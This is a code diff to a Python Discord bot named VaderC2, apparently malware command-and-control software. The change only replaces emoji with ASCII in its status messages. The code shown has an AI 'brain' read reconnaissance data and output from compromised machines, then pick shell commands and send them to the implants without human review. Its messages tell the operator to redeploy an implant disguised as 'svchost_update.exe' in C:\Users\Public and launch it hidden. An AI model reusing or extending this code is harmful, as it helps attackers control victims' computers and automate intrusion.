@@ -178,7 +178,7 @@ class VaderC2(discord.Client):
         self.log(f"Monitoring channel {self.c2_channel_id}")
         channel = self.get_channel(self.c2_channel_id)
         if channel:
-            await channel.send(f"```\n☠ CHEYANNE C2 ONLINE — brain={self.brain.provider}\n"
+            await channel.send(f"```\n[X] CHEYANNE C2 ONLINE — brain={self.brain.provider}\n"
                                f"  Waiting for implant callbacks...\n```")
 
     async def on_message(self, message):
@@ -234,7 +234,7 @@ class VaderC2(discord.Client):
                 self.log(f"BRAIN thinking about {session_id}...")
                 reply = self.brain.think(session_id, "RECON", recon_data)
                 if reply:
-                    await channel.send(f"```\n🧠 BRAIN:\n{reply}\n```")
+                    await channel.send(f"```\n[BRAIN]\n{reply}\n```")
                     cmd = self.extract_command(reply)
                     if cmd:
                         await self.send_command(session_id, cmd)
@@ -253,7 +253,7 @@ class VaderC2(discord.Client):
             if self.brain.provider != "none":
                 reply = self.brain.think(session_id, "OUTPUT", output)
                 if reply:
-                    await channel.send(f"```\n🧠 BRAIN:\n{reply}\n```")
+                    await channel.send(f"```\n[BRAIN]\n{reply}\n```")
                     cmd = self.extract_command(reply)
                     if cmd:
                         await self.send_command(session_id, cmd)
@@ -278,7 +278,7 @@ class VaderC2(discord.Client):
             "command": "echo UA_PROBE_OK"
         })
         await channel.send(probe_cmd)
-        self.log(f"UA PROBE sent → {session_id}")
+        self.log(f"UA PROBE sent -> {session_id}")
 
         await asyncio.sleep(20)
 
@@ -290,17 +290,17 @@ class VaderC2(discord.Client):
         )
         if got_reply:
             await channel.send(
-                f"```diff\n+ BEACON {session_id} ({hostname}) — NEW BINARY ✅\n"
+                f"```diff\n+ BEACON {session_id} ({hostname}) — NEW BINARY [PASS]\n"
                 f"+ UA probe replied — can receive commands\n```"
             )
             self.log(f"UA PROBE PASS: {session_id} — new binary confirmed")
         else:
             await channel.send(
-                f"```diff\n- BEACON {session_id} ({hostname}) — OLD BINARY ❌\n"
+                f"```diff\n- BEACON {session_id} ({hostname}) — OLD BINARY [FAIL]\n"
                 f"- UA probe no reply — Mozilla/5.0 bug — cannot receive commands\n"
                 f"- FIX: deploy agent/dist/svchost_update.exe to target machine\n"
                 f"- CMD: taskkill /IM svchost_update.exe /F\n"
-                f"-      copy new binary → C:\\Users\\Public\\svchost_update.exe\n"
+                f"-      copy new binary -> C:\\Users\\Public\\svchost_update.exe\n"
                 f"-      start /B C:\\Users\\Public\\svchost_update.exe\n```"
             )
             self.log(f"UA PROBE FAIL: {session_id} — old binary (UA bug)")
